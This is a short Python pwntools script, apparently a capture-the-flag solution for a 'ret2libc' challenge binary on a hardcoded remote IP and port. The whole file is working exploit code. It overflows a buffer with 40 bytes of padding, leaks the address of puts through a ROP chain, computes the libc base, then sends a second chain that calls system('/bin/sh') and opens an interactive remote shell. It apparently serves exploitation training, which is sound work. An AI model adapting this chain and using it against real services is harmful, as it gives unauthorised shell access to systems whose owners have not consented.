from pwn import *

ip = '143.198.127.103'
port = 42001 

p = connect(ip, port)


binary = ELF('./ret2libc')
context.binary = binary
rop = ROP(binary)
libc = ELF('./libc-2.31.so')


rop.raw('a'*40)
rop.puts(binary.got.puts)
rop.call(binary.entry)
print(rop.dump())

p.recvuntil(b'would you like to learn about ret2libc?[y/N]')

p.sendline(rop.chain())
p.recvuntil(b'I see, you must be a natural!\n')
p.recvline()
leaked_puts = p.recvline()[:8].strip()
print("Leaked puts@GLIBC: {}".format(leaked_puts))

leaked_puts = int.from_bytes(leaked_puts, byteorder='little')
libc.address = leaked_puts - libc.symbols.puts

rop2 = ROP(libc)
rop2.raw("a"*40)
rop2.call(rop.ret)
rop2.system(next(libc.search(b'/bin/sh\0')))


p.recvuntil(b'would you like to learn about ret2libc?[y/N]')
p.sendline(rop2.chain())


p.interactive()


